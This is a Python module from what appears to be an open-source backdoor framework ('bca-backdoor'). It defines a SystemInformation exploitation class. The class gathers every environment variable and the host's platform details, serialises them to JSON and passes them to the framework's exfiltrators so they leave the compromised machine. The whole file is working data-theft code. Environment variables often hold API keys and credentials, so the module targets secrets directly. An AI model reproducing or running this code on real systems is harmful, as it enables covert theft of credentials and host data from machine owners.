#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = 'EONRaider @ keybase.io/eonraider'

import json
import os
import platform

from src.modules.exploitation.base import ExploitationModule


class SystemInformation(ExploitationModule):
    def __init__(self):
        """Perform a collection of data on the host's system resources
        and send it to pre-configured exfiltration methods."""
        super().__init__()
        self.sys_info = dict()
        self.env_info = dict()

    def execute(self):
        # Build a dictionary containing all environment variables
        self.env_info = {env: value for env, value in os.environ.items()}

        # Extract System information: system, node, release, version,
        # machine and processor
        self.sys_info = platform.uname()._asdict()

        self.sys_info.update({"environment": self.env_info})
        self.exfil_buffer.append(json.dumps(self.sys_info))
        self._notify_all_exfiltrators()
